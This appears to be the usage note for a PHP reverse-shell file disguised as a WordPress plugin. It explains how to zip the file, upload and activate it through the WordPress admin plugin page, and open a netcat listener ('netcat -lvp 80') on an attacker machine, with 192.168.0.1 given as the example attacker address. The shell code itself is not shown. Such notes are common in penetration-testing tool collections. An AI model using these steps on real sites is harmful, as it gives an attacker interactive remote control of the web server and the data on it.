# wordpress_plugin_reverse_shell.php
1.) Zip up php file.
2.) Navigate WP UI -> Plugins -> Add New -> Upload Plugin 
   -> Browse -> Install Now -> Activate Plugin.
3.) Setup listening port from attacker machine (PHP script uses example - 192.168.0.1): netcat -lvp 80
